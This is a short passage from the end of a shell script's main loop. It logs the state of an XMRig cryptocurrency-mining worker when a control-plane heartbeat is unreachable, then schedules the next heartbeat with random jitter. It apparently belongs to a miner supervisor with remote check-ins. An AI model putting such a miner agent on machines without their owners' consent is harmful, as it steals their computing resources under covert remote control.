                    log ERROR "CONTROL-PLANE HEARTBEAT UNREACHABLE; XMRIG WORKER REMAINS RUNNING INDEPENDENTLY"
                else
                    log ERROR "CONTROL-PLANE HEARTBEAT UNREACHABLE; XMRIG WORKER IS ALSO DOWN (SEPARATE CONDITION)"
                fi
            fi
        fi
        NEXT_HEARTBEAT=$((NOW + HEARTBEAT_INTERVAL + RANDOM % 21))
    fi

    sleep "$MAIN_LOOP_INTERVAL"
done
 
